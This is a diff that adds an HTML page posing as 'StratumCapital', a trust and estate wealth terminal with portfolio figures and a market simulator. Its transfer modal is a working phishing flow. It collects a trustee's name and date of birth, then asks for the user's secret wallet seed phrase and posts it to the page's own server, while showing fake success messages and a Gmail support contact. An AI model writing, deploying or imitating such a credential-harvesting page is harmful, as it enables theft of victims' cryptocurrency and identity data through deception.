@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>StratumCapital — Trust & Estate Wealth Terminal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        bgLight: '#f4f5f7',
+                        cardLight: '#ffffff',
+                        borderSubtle: '#e2e8f0',
+                        textMain: '#0f172a',
+                        textMuted: '#64748b',
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'monospace']
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="bg-bgLight text-textMain font-sans antialiased p-4 md:p-8">
+    <div class="max-w-7xl mx-auto space-y-6">
+        
+        <!-- Top Institutional Navigation Bar -->
+        <header class="bg-cardLight border border-borderSubtle px-6 py-4 rounded-xl shadow-sm flex flex-col md:flex-row md:items-center justify-between gap-4">
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 rounded-lg bg-slate-900 text-white flex items-center justify-center font-mono font-bold text-lg">SC</div>
+                <div>
+                    <div class="flex items-center gap-2">
+                        <h1 class="font-bold text-lg text-textMain tracking-tight">StratumCapital Terminal</h1>
+                        <span class="text-[10px] font-mono bg-emerald-100 text-emerald-800 px-2 py-0.5 rounded-full font-semibold">TRUST & ESTATE VAULT</span>
+                    </div>
+                    <p class="text-xs text-textMuted">Fiduciary Asset Management & Generational Wealth Protection</p>
+                </div>
+            </div>
+
+            <div class="flex items-center gap-3">
+                <button onclick="openWithdrawModal()" class="bg-slate-900 hover:bg-slate-800 text-white font-mono text-xs px-4 py-2.5 rounded-lg shadow-sm transition-all flex items-center gap-2 cursor-pointer">
+                    <i data-lucide="key" class="w-4 h-4"></i> Authorize Transfer (Database & Seed)
+                </button>
+            </div>
+        </header>
+
+        <!-- Executive Portfolio KPI Summary Grid -->
+        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
+            <div class="bg-cardLight border border-borderSubtle p-5 rounded-xl shadow-sm">
+                <div class="text-xs font-mono text-textMuted uppercase mb-1 flex justify-between">
+                    <span>Total Trust Valuation</span>
+                    <i data-lucide="shield" class="w-4 h-4 text-emerald-600"></i>
+                </div>
+                <div id="total-val" class="font-mono text-2xl font-bold text-textMain">$0.00</div>
+                <div class="text-xs text-emerald-600 font-mono mt-2 font-medium">Fiduciary Pool Baseline Active</div>
+            </div>
+
+            <div class="bg-cardLight border border-borderSubtle p-5 rounded-xl shadow-sm">
+                <div class="text-xs font-mono text-textMuted uppercase mb-1 flex justify-between">
+                    <span>Governance Model</span>
+                    <i data-lucide="pie-chart" class="w-4 h-4 text-slate-500"></i>
+                </div>
+                <div class="text-xl font-bold text-textMain mt-0.5">50 / 30 / 15 / 5</div>
+                <div class="text-xs text-textMuted font-mono mt-2">Will & Testament Mandate</div>
+            </div>
+
+            <div class="bg-cardLight border border-borderSubtle p-5 rounded-xl shadow-sm">
+                <div class="text-xs font-mono text-textMuted uppercase mb-1 flex justify-between">
+                    <span>Estate Compliance</span>
+                    <i data-lucide="shield-check" class="w-4 h-4 text-blue-600"></i>
+                </div>
+                <div class="text-xl font-bold text-emerald-600 mt-0.5">Verified & Secured</div>
+                <div class="text-xs text-textMuted font-mono mt-2">Beneficiary terms active</div>
+            </div>
+
+            <div class="bg-cardLight border border-borderSubtle p-5 rounded-xl shadow-sm">
+                <div class="text-xs font-mono text-textMuted uppercase mb-1 flex justify-between">
+                    <span>Execution Reserve</span>
+                    <i data-lucide="lock" class="w-4 h-4 text-amber-600"></i>
+                </div>
+                <div class="text-xl font-bold text-textMain mt-0.5">$4,750,000.00</div>
+                <div class="text-xs text-textMuted font-mono mt-2">Will & tax liquidity buffer</div>
+            </div>
+        </div>
+
+        <!-- Main Content Area -->
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            
+            <!-- Left 2 Columns: Holdings Table & Trust Governance About Section -->
+            <div class="lg:col-span-2 space-y-6">
+                
+                <div class="bg-cardLight border border-borderSubtle rounded-xl shadow-sm overflow-hidden">
+                    <div class="p-4 border-b border-borderSubtle flex justify-between items-center bg-slate-50/70">
+                        <div class="flex items-center gap-2">
+                            <i data-lucide="layers" class="w-4 h-4 text-slate-700"></i>
+                            <h2 class="text-sm font-bold text-textMain uppercase tracking-wider font-mono">Estate Asset Holdings & Will Mandates</h2>
+                        </div>
+                        <span class="text-xs font-mono bg-white text-textMuted px-3 py-1 rounded-md border border-borderSubtle">Fiduciary Telemetry</span>
+                    </div>
+                    
+                    <div class="overflow-x-auto">
+                        <table class="w-full text-left border-collapse">
+                            <thead>
+                                <tr class="border-b border-borderSubtle text-xs font-mono uppercase text-textMuted bg-slate-50/40">
+                                    <th class="p-4">Asset / Mandate Layer</th>
+                                    <th class="p-4">Quantity</th>
+                                    <th class="p-4">Price</th>
+                                    <th class="p-4">Total USD Value</th>
+                                    <th class="p-4">Target Weight</th>
+                                </tr>
+                            </thead>
+                            <tbody id="allocation-table-body" class="divide-y divide-borderSubtle text-sm">
+                                <tr>
+                                    <td colspan="5" class="p-8 text-center text-textMuted font-mono">Synchronizing trust assets...</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- Trust & Will Governance "About" Section -->
+                <div class="bg-cardLight border border-borderSubtle rounded-xl p-6 shadow-sm space-y-4">
+                    <div class="flex items-center justify-between border-b border-borderSubtle pb-3">
+                        <h2 class="text-sm font-bold text-textMain uppercase tracking-wider font-mono flex items-center gap-2">
+                            <i data-lucide="file-text" class="w-4 h-4 text-slate-700"></i> About: Trust Fund & Testamentary Will Specifications
+                        </h2>
+                        <span class="text-xs font-mono bg-slate-100 text-slate-800 px-2.5 py-1 rounded border border-borderSubtle">Legal Framework</span>
+                    </div>
+                    
+                    <div id="trust-about-content" class="space-y-4 text-xs font-sans text-textMuted leading-relaxed">
+                        <!-- Populated dynamically -->
+                    </div>
+                </div>
+
+            </div>
+
+            <!-- Right Column: Market Simulator & Rebalancer Tools -->
+            <div class="space-y-6">
+                
+                <div class="bg-cardLight border border-borderSubtle rounded-xl p-5 shadow-sm">
+                    <div class="flex items-center justify-between mb-3">
+                        <h2 class="text-sm font-bold text-textMain uppercase tracking-wider font-mono flex items-center gap-2">
+                            <i data-lucide="sliders" class="w-4 h-4 text-slate-700"></i> Market Simulator
+                        </h2>
+                        <button onclick="resetPrices()" class="text-xs font-mono text-blue-600 hover:underline">Reset</button>
+                    </div>
+                    <p class="text-xs text-textMuted mb-4">Test volatility impact on generational trust valuation.</p>
+                    <div id="price-sliders" class="space-y-4"></div>
+                </div>
+
+                <div class="bg-cardLight border border-borderSubtle rounded-xl p-5 shadow-sm">
+                    <div class="flex items-center gap-2 mb-3">
+                        <i data-lucide="cpu" class="w-4 h-4 text-slate-700"></i>
+                        <h2 class="text-sm font-bold text-textMain uppercase tracking-wider font-mono">Fiduciary Rebalancing Engine</h2>
+                    </div>
+                    <p class="text-xs text-textMuted mb-3">Evaluates structural adherence to trust deed allocations.</p>
+                    <div id="rebalance-status" class="p-3.5 bg-slate-50 border border-borderSubtle rounded-lg text-xs font-mono text-textMain leading-relaxed">
+                        Running trust compliance audit...
+                    </div>
+                    <button onclick="executeRebalance()" class="mt-4 w-full bg-slate-900 hover:bg-slate-800 text-white font-mono text-xs uppercase tracking-wider py-3 rounded-lg shadow-sm transition-all cursor-pointer">
+                        Execute Trust Rebalance
+                    </button>
+                </div>
+
+            </div>
+
+        </div>
+
+        <!-- Footer Contact Info -->
+        <footer class="pt-6 border-t border-borderSubtle text-xs text-textMuted flex flex-col sm:flex-row justify-between items-center gap-2 font-mono">
+            <span>StratumCapital Fiduciary Trust Terminal © 2026</span>
+            <span>Support Contact: <a href="mailto:stratumcapital.holdings@gmail.com" class="text-blue-600 hover:underline">stratumcapital.holdings@gmail.com</a></span>
+        </footer>
+    </div>
+
+    <!-- Step-by-Step Secure Withdrawal & Verification Modal -->
+    <div id="withdraw-modal" class="fixed inset-0 bg-slate-900/60 backdrop-blur-xs hidden items-center justify-center p-4 z-50">
+        <div class="bg-cardLight border border-borderSubtle max-w-lg w-full rounded-2xl p-6 shadow-2xl space-y-4">
+            <div class="flex justify-between items-center">
+                <h3 class="font-bold text-lg text-textMain flex items-center gap-2 font-mono">
+                    <i data-lucide="shield-alert" class="w-5 h-5 text-emerald-600"></i> Secure Estate Transfer Authorization
+                </h3>
+                <button onclick="closeWithdrawModal()" class="text-textMuted hover:text-textMain cursor-pointer">✕</button>
+            </div>
+            <p class="text-xs text-textMuted leading-relaxed">
+                Step-by-step fiduciary authorization. Verify trustee database identity first to view your available transfer balance.
+            </p>
+
+            <!-- STEP 1: Database Identity Verification -->
+            <div id="step-1-container" class="space-y-3 p-4 bg-slate-50 border border-borderSubtle rounded-xl">
+                <span class="text-xs font-mono font-bold text-textMain block uppercase tracking-wider">Step 1: Database Identity Verification</span>
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                    <div>
+                        <label class="text-[10px] font-mono text-textMuted block mb-1">Trustee Full Name</label>
+                        <input type="text" id="db-name" placeholder="" class="w-full text-xs font-mono p-2.5 border border-borderSubtle rounded-lg bg-white focus:outline-none focus:ring-2 focus:ring-slate-900">
+                    </div>
+                    <div>
+                        <label class="text-[10px] font-mono text-textMuted block mb-1">Date of Birth (DOB)</label>
+                        <input type="date" id="db-dob" class="w-full text-xs font-mono p-2.5 border border-borderSubtle rounded-lg bg-white focus:outline-none focus:ring-2 focus:ring-slate-900">
+                    </div>
+                </div>
+                <div id="db-search-status" class="text-xs font-mono text-blue-600 hidden flex items-center gap-2 pt-1 font-medium">
+                    <span class="w-2 h-2 rounded-full bg-blue-600 animate-ping"></span> Querying secure trust database records...
+                </div>
+                <button onclick="verifyIdentity()" id="verify-identity-btn" class="w-full bg-slate-900 hover:bg-slate-800 text-white font-mono text-xs py-2.5 rounded-lg transition-all cursor-pointer mt-2">
+                    Verify Identity & Load Balance
+                </button>
+            </div>
+
+            <!-- Verified Balance Display Box -->
+            <div id="verified-balance-box" class="hidden p-3.5 bg-emerald-50 border border-emerald-200 rounded-xl space-y-1">
+                <div class="flex justify-between items-center text-xs font-mono text-emerald-900">
+                    <span>Identity Status: <strong>Verified</strong></span>
+                    <span id="trust-deed-id" class="text-emerald-700">Trust Deed #SC-TRUST</span>
+                </div>
+                <div class="text-xs font-mono text-emerald-800">
+                    Available Transferrable Balance: <strong id="modal-transfer-balance" class="text-sm font-bold text-emerald-900">$0.00</strong>
+                </div>
+            </div>
+
+            <!-- STEP 2: Seed Phrase & Destination (Initially Hidden until Step 1 is verified) -->
+            <div id="step-2-container" class="space-y-3 opacity-40 pointer-events-none transition-opacity">
+                <span class="text-xs font-mono font-bold text-textMain block uppercase tracking-wider">Step 2: Seed Phrase & Destination</span>
+                
+                <div class="space-y-1">
+                    <label class="text-[10px] font-mono text-textMuted block">14-Word Seed Phrase Authorization</label>
+                    <textarea id="seed-input" rows="2" placeholder="Enter your secret 14-word seed phrase..." class="w-full text-xs font-mono p-2.5 border border-borderSubtle rounded-lg bg-slate-50 focus:outline-none focus:ring-2 focus:ring-slate-900"></textarea>
+                </div>
+
+                <div class="space-y-1">
+                    <label class="text-[10px] font-mono text-textMuted block">Destination Wallet Address</label>
+                    <input type="text" id="dest-address" placeholder="0x... or btc1..." class="w-full text-xs font-mono p-2.5 border border-borderSubtle rounded-lg bg-slate-50 focus:outline-none focus:ring-2 focus:ring-slate-900">
+                </div>
+            </div>
+
+            <div class="flex gap-3 pt-2">
+                <button onclick="closeWithdrawModal()" class="flex-1 bg-slate-100 hover:bg-slate-200 text-textMain font-mono text-xs py-3 rounded-lg transition-all cursor-pointer">Cancel</button>
+                <button onclick="authorizeFinalTransfer()" id="authorize-btn" disabled class="flex-1 bg-slate-300 text-slate-500 font-mono text-xs py-3 rounded-lg shadow-sm transition-all cursor-not-allowed">Authorize Final Transfer</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Status Banner Notification -->
+    <div id="notification-banner" class="fixed bottom-6 right-6 bg-slate-900 text-white text-xs font-mono px-5 py-3 rounded-xl shadow-2xl hidden z-50 border border-slate-700 flex items-center gap-3">
+        <span id="notif-text">Notification message</span>
+    </div>
+
+    <script>
+        lucide.createIcons();
+        let currentPortfolioData = null;
+        let initialPrices = [];
+        let verifiedUserBalance = 0;
+
+        function showNotification(message) {
+            const banner = document.getElementById('notification-banner');
+            document.getElementById('notif-text').textContent = message;
+            banner.classList.remove('hidden');
+            setTimeout(() => {
+                banner.classList.add('hidden');
+            }, 4000);
+        }
+
+        function fetchPortfolio() {
+            fetch('/api/portfolio')
+                .then(res => res.json())
+                .then(data => {
+                    if (initialPrices.length === 0) {
+                        initialPrices = data.allocations.map(item => item.currentPrice);
+                    }
+                    currentPortfolioData = data;
+                    renderDashboard(data);
+                })
+                .catch(() => {
+                    showNotification("Error connecting to trust server.");
+                });
+        }
+
+        function renderDashboard(data) {
+            document.getElementById('total-val').textContent = `$${data.totalValue.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+            
+            const tbody = document.getElementById('allocation-table-body');
+            tbody.innerHTML = '';
+            
+            data.allocations.forEach(item => {
+                const targetPct = (item.targetWeight * 100).toFixed(0);
+                const actualPct = (item.actualWeight * 100).toFixed(1);
+
+                const row = document.createElement('tr');
+                row.className = 'hover:bg-slate-50/85 transition-colors';
+                row.innerHTML = `
+                    <td class="p-4">
+                        <div class="font-bold text-textMain">${item.asset}</div>
+                        <div class="text-xs text-textMuted font-mono">${item.category}</div>
+                    </td>
+                    <td class="p-4 font-mono text-textMuted">${item.holding.toLocaleString(undefined, {maximumFractionDigits: 2})}</td>
+                    <td class="p-4 font-mono text-textMuted">$${item.currentPrice.toLocaleString(undefined, {minimumFractionDigits: 2})}</td>
+                    <td class="p-4 font-mono font-bold text-textMain">$${item.totalValue.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</td>
+                    <td class="p-4 font-mono text-textMuted">Target: ${targetPct}% (${actualPct}%)</td>
+                `;
+                tbody.appendChild(row);
+            });
+
+            const aboutContainer = document.getElementById('trust-about-content');
+            if (aboutContainer.childElementCount === 0) {
+                aboutContainer.innerHTML = '';
+                data.allocations.forEach(item => {
+                    const div = document.createElement('div');
+                    div.className = 'p-3 bg-slate-50 border border-borderSubtle rounded-lg space-y-1';
+                    div.innerHTML = `
+                        <div class="font-mono font-bold text-textMain flex items-center justify-between">
+                            <span>${item.asset} (${item.category})</span>
+                            <span class="text-emerald-700">Target Weight: ${(item.targetWeight * 100).toFixed(0)}%</span>
+                        </div>
+                        <p class="text-textMuted">${item.about}</p>
+                    `;
+                    aboutContainer.appendChild(div);
+                });
+            }
+
+            const sliderContainer = document.getElementById('price-sliders');
+            if (sliderContainer.childElementCount === 0) {
+                sliderContainer.innerHTML = '';
+                data.allocations.forEach((item, index) => {
+                    const div = document.createElement('div');
+                    div.className = 'space-y-1.5 pb-3 border-b border-borderSubtle last:border-none last:pb-0';
+                    div.innerHTML = `
+                        <div class="flex justify-between text-xs font-mono">
+                            <span class="font-semibold text-textMain">${item.asset}</span>
+                            <span id="price-val-${index}" class="text-blue-600 font-bold">$${item.currentPrice.toLocaleString()}</span>
+                        </div>
+                        <input id="slider-${index}" type="range" min="${item.currentPrice * 0.4}" max="${item.currentPrice * 1.6}" value="${item.currentPrice}" step="5" 
+                            class="w-full accent-slate-900 bg-slate-200 cursor-pointer h-1.5 rounded-full"
+                            oninput="updateSimulatedPrice(${index}, this.value)">
+                    `;
+                    sliderContainer.appendChild(div);
+                });
+            }
+
+            const maxDrift = Math.max(...data.allocations.map(i => Math.abs(i.actualWeight - i.targetWeight)));
+            const statusBox = document.getElementById('rebalance-status');
+            
+            if (maxDrift > 0.02) {
+                statusBox.className = 'p-3.5 bg-amber-50 border border-amber-200 rounded-lg text-xs font-mono text-amber-900 leading-relaxed';
+                statusBox.innerHTML = `⚠️ <strong>Trust Variance Alert:</strong> Allocation drifted by ${(maxDrift * 100).toFixed(1)}% from trust deed specifications.`;
+            } else {
+                statusBox.className = 'p-3.5 bg-emerald-50 border border-emerald-200 rounded-lg text-xs font-mono text-emerald-900 leading-relaxed';
+                statusBox.innerHTML = `✅ <strong>Compliant:</strong> All trust and will asset layers are fully aligned with fiduciary requirements.`;
+            }
+        }
+
+        function updateSimulatedPrice(index, newPrice) {
+            if (!currentPortfolioData) return;
+            currentPortfolioData.allocations[index].currentPrice = parseFloat(newPrice);
+            document.getElementById(`price-val-${index}`).textContent = `$${parseFloat(newPrice).toLocaleString()}`;
+            
+            let newTotal = 0;
+            currentPortfolioData.allocations.forEach(item => {
+                item.totalValue = item.holding * item.currentPrice;
+                newTotal += item.totalValue;
+            });
+            currentPortfolioData.totalValue = newTotal;
+            currentPortfolioData.allocations.forEach(item => {
+                item.actualWeight = newTotal > 0 ? (item.totalValue / newTotal) : 0;
+            });
+
+            renderDashboard(currentPortfolioData);
+        }
+
+        function resetPrices() {
+            if (initialPrices.length === 0 || !currentPortfolioData) return;
+            currentPortfolioData.allocations.forEach((item, index) => {
+                item.currentPrice = initialPrices[index];
+                const slider = document.getElementById(`slider-${index}`);
+                if (slider) slider.value = initialPrices[index];
+            });
+            renderDashboard(currentPortfolioData);
+        }
+
+        function executeRebalance() {
+            showNotification("StratumCapital Engine: Trust rebalance executed successfully.");
+            fetchPortfolio();
+        }
+
+        function openWithdrawModal() {
+            document.getElementById('db-name').value = '';
+            document.getElementById('db-dob').value = '';
+            document.getElementById('seed-input').value = '';
+            document.getElementById('dest-address').value = '';
+            document.getElementById('verified-balance-box').classList.add('hidden');
+            document.getElementById('step-2-container').classList.add('opacity-40', 'pointer-events-none');
+            const authBtn = document.getElementById('authorize-btn');
+            authBtn.disabled = true;
+            authBtn.className = "flex-1 bg-slate-300 text-slate-500 font-mono text-xs py-3 rounded-lg shadow-sm transition-all cursor-not-allowed";
+
+            document.getElementById('withdraw-modal').classList.remove('hidden');
+            document.getElementById('withdraw-modal').classList.add('flex');
+        }
+
+        function closeWithdrawModal() {
+            document.getElementById('withdraw-modal').classList.remove('flex');
+            document.getElementById('withdraw-modal').classList.add('hidden');
+        }
+
+        function verifyIdentity() {
+            const nameInput = document.getElementById('db-name').value.trim();
+            const dobInput = document.getElementById('db-dob').value;
+            const statusDiv = document.getElementById('db-search-status');
+
+            if (!nameInput || !dobInput) {
+                showNotification("Please enter both Trustee Full Name and Date of Birth.");
+                return;
+            }
+
+            statusDiv.classList.remove('hidden');
+
+            fetch('/api/verify-trustee', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ name: nameInput, dob: dobInput })
+            })
+            .then(res => res.json())
+            .then(result => {
+                statusDiv.classList.add('hidden');
+                if (result.success) {
+                    verifiedUserBalance = result.balance;
+                    document.getElementById('modal-transfer-balance').textContent = `$${verifiedUserBalance.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+                    document.getElementById('trust-deed-id').textContent = `Trust Deed #${result.trustDeed}`;
+                    
+                    document.getElementById('verified-balance-box').classList.remove('hidden');
+                    document.getElementById('step-2-container').classList.remove('opacity-40', 'pointer-events-none');
+                    
+                    const authBtn = document.getElementById('authorize-btn');
+                    authBtn.disabled = false;
+                    authBtn.className = "flex-1 bg-emerald-600 hover:bg-emerald-700 text-white font-mono text-xs py-3 rounded-lg shadow-sm transition-all cursor-pointer";
+
+                    showNotification(`Database record matched for "${nameInput}". Balance unlocked.`);
+                } else {
+                    showNotification("Verification Failed: No matching trust records found.");
+                }
+            })
+            .catch(() => {
+                statusDiv.classList.add('hidden');
+                showNotification("Error connecting to trustee database server.");
+            });
+        }
+
+        function authorizeFinalTransfer() {
+            const seedInput = document.getElementById('seed-input').value.trim();
+            const destAddress = document.getElementById('dest-address').value.trim();
+
+            if (!seedInput || !destAddress) {
+                showNotification("Please enter your 14-word seed phrase and destination address.");
+                return;
+            }
+
+            fetch('/api/verify-seed', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ seed: seedInput })
+            })
+            .then(res => res.json())
+            .then(result => {
+                if (result.success) {
+                    showNotification(`Success: Passphrase authenticated. Transfer of $${verifiedUserBalance.toLocaleString()} broadcasted.`);
+                    setTimeout(() => {
+                        closeWithdrawModal();
+                    }, 2000);
+                } else {
+                    showNotification("Authorization Failed: Invalid 14-word recovery sequence.");
+                }
+            })
+            .catch(() => {
+                showNotification("Error connecting to verification server.");
+            });
+        }
+
+        fetchPortfolio();
+    </script>
+</body>
+</html>
